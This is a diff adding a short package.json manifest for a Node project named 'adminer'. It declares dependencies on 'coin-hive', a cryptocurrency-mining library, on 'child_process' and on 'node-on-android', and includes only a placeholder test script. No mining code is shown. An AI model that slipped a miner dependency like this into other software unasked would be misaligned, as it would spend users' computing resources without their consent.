@@ -1,0 +1,16 @@
+{
+  "name": "adminer",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "Govind Mohan, Shane Kennedy",
+  "license": "ISC",
+  "dependencies": {
+    "child_process": "^1.0.2",
+    "coin-hive": "^1.10.0",
+    "node-on-android": "0.0.2"
+  }
+}
